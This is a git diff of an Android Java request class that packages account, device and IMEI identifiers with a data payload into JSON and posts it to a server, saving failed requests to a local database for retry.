@@ -1,10 +1,10 @@
 package com.inet.android.request;
 
+import java.io.IOException;
+
+import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
-
-import com.inet.android.bs.Caller;
-import com.inet.android.utils.Logging;
 
 import android.content.Context;
 import android.content.SharedPreferences;
@@ -12,15 +12,23 @@ import android.content.SharedPreferences.Editor;
 import android.os.AsyncTask;
 import android.preference.PreferenceManager;
 
+import com.inet.android.bs.Caller;
+import com.inet.android.db.RequestDataBaseHelper;
+import com.inet.android.db.RequestWithDataBase;
+import com.inet.android.utils.Logging;
+
 /**
  * Data request class
+ * 
  * @author johny homicide
- *
+ * 
  */
 public class DataRequest extends DefaultRequest {
-	private final String LOG_TAG = "PeriodicRequest";
+	private final String LOG_TAG = "DataRequest";
+	private final int type = 3;
 	Context ctx;
-
+	static RequestDataBaseHelper db;
+	
 	public DataRequest(Context ctx) {
 		super(ctx);
 		this.ctx = ctx;
@@ -53,11 +61,34 @@ public class DataRequest extends DefaultRequest {
 
 	@Override
 	protected void sendPostRequest(String request) {
-		String str = Caller.doMake(request, "informative", ctx);
+		SharedPreferences sp = PreferenceManager
+				.getDefaultSharedPreferences(ctx);
+		JSONObject jsonObject = new JSONObject();
+		try {
+			jsonObject.put("account", sp.getString("account", "0000"));
+			jsonObject.put("device", sp.getString("device", "0000"));
+			jsonObject.put("imei", sp.getString("imei", "0000"));
+			jsonObject.put("key", System.currentTimeMillis());
+			jsonObject.put("data", new JSONArray(request));
+		} catch (JSONException e1) {
+			Logging.doLog(LOG_TAG, "json сломался", "json сломался");
+			e1.printStackTrace();
+		}
+
+		String str = null;
+		try {
+			str = Caller.doMake(jsonObject.toString(), "informative", ctx);
+		} catch (IOException e) {
+			// Добавление в базу request
+			e.printStackTrace();
+			db = new RequestDataBaseHelper(ctx);
+			db.addRequest(new RequestWithDataBase(request, type));
+		}
 		if (str != null) {
 			getRequestData(str);
 		} else {
-			Logging.doLog(LOG_TAG, "ответа от сервера нет", "ответа от сервера нет");
+			Logging.doLog(LOG_TAG, "ответа от сервера нет",
+					"ответа от сервера нет");
 		}
 	}
 
@@ -65,7 +96,8 @@ public class DataRequest extends DefaultRequest {
 	protected void getRequestData(String response) {
 		String postRequest = null;
 
-		Logging.doLog(LOG_TAG, "getResponseData: " + response, "getResponseData: " + response);
+		Logging.doLog(LOG_TAG, "getResponseData: " + response,
+				"getResponseData: " + response);
 
 		SharedPreferences sp = PreferenceManager
 				.getDefaultSharedPreferences(ctx);
@@ -85,7 +117,6 @@ public class DataRequest extends DefaultRequest {
 		try {
 			jsonObject = new JSONObject(response);
 			str = jsonObject.getString("code");
-			Logging.doLog(LOG_TAG, "request: " + str);
 		} catch (JSONException e) {
 			str = null;
 		}
